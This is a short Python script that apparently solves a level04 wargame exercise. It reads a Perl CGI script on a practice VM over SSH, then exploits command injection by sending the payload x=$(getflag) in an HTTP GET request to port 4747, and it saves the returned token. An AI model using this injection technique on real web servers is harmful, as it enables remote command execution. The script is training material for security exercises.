import sys
import requests
sys.path.append("../..")

from utils.ssh import sanitize_token, connect_by_previous, exec, save_token, VM_ADDRESS
from utils.text import print_title, print_output

client = connect_by_previous()
script_content = exec(client, 'cat level04.pl', title='Read script')
print_output(script_content)
print_title('CGI server, print value of X param (GET)')

print_title('Send request with x=$(getflag)')
response = requests.get(f'http://{VM_ADDRESS}:4747?x=$(getflag)').text
print_output(response, 'Server response')

token = sanitize_token(response)
client.close()
save_token(token)

